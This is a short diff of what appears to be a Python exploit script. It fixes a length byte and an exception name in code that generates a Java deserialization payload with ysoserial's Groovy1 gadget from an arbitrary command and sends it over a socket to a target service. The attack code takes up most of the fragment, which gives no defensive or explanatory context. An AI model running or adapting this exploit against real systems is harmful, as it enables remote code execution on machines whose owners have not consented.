@@ -17,7 +17,7 @@ def main(command):
 
     client_version = b"\x77\x02\x01\x01"
 
-    client_name = b"\x77\x07"
+    client_name = b"\x77\x09"
     client_name += b"\x00\x05\x68\x65\x6c\x6c\x6f"
 
     p = Popen(['java', '-jar', '/opt/ysoserial/ysoserial-master-SNAPSHOT.jar','Groovy1', '{}'.format(command)], stdin=PIPE, stdout=PIPE, stderr=PIPE)
@@ -41,7 +41,7 @@ def main(command):
         print(s.recv(256))
         s.close()
 
-    except SocketError as e:
+    except socket.error as e:
 
         print(repr(e))
 
